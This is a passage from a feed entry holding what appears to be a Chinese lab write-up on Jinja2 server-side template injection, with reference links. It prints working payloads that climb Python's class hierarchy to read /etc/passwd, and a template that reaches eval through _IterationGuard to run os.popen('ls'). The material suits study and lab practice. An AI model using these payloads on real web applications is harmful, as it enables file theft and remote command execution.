-... 
-40
-#寻找file对象
-
-
-&gt;&gt;&gt; dir(().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').readlines)
-['__call__', '__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__module__', '__name__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__self__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__']
-#使用dir查看对象内置方法：
-
-
-
-</code></pre>
-<p>同样的方法使用eval方法来获取目录文件</p>
-<pre><code class="language-jinja2">{% for c in ().__class__.__bases__[0].__subclasses__(): %}
-{% if c.__name__ == '_IterationGuard': %}
-{{c.__init__.__globals__['__builtins__']['eval'](&quot;__import__('os').popen('ls').read()&quot;) }}
-{% endif %}
-{% endfor %}
-</code></pre>
-<figure data-type="image" tabindex="4"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/4.png" alt="" loading="lazy"></figure>
-<p>参考链接：<a href="https://www.freebuf.com/articles/web/98619.html">https://www.freebuf.com/articles/web/98619.html</a></p>
-<p>​		<a href="https://www.cnblogs.com/hackxf/p/10480071.html">https://www.cnblogs.com/hackxf/p/10480071.html</a></p>
-<p>​		<a href="https://eustiar.com/archives/157">https://eustiar.com/archives/157</a></p>
 ]]></content>
     </entry>
 </feed>
